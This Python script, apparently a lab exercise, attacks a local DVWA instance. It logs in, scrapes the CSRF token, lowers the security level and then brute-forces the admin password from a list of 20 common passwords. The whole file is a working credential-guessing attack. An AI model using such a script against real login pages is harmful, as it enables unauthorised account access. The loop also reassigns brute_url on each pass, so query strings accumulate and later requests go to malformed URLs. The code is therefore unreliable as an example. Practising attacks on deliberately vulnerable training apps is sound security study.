import requests
from bs4 import BeautifulSoup

# my name to be included in the output
my_name = "Mohamed Magdy Nayel"

# urls used
login_url = "http://127.0.0.1/dvwa/login.php"
security = "http://127.0.0.1/dvwa/security.php#"
brute_url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"

# username for the attacking
username = "admin"

# set the security cookie to 'low'
# cookies = {'security': 'low'}
# predefined list of 20 common passwords
password_list = [
    "123456",
    "admin",
    "Admin123",
    "12345678",
    "123456789",
    "1234",
    "qwerty",
    "letmein",
    "111111",
    "1234567890",
    "football",
    "iloveyou",
    "welcome",
    "666666",
    "Password",
    "password",
    "1231231",
    "12345678910",
    "abc123",
    "passw0rd",
]

# Create a session to store cookies
session = requests.Session()

# get CSRF token from the login page
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "user_token"})["value"]

# the login parameters including the token
payload = {
    "username": username,
    "password": "password",
    "Login": "Login",
    "user_token": csrf_token,  # Include the CSRF token
}

# login with post request
response = session.post(login_url, data=payload)
# print("response code: ", response.text)

# Set security to low
Sec_payload = {
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": csrf_token,  # Include the CSRF token
}
response = session.post(security, data=Sec_payload)
# print("response code: ", response.text)

# preforming the bruteforce attack using the predefined dictonary passwords
for password in password_list:
    brute_url = f"{brute_url}?username=admin&password={password}&Login=Login"
    response2 = session.get(brute_url)
    # print("response code: ", response2.text)
    if "Welcome to the password protected area admin" in response2.text:
        print(
            f"\033[32mTrying '{password}' for user 'admin' ({my_name}) Success\nthe correct password is '{password}'\033[0m"
        )
        break
    elif "Username and/or password incorrect" in response2.text:
        print(
            f"\033[31mTrying '{password}' Against User 'admin' ({my_name}) failed\033[0m"
        )
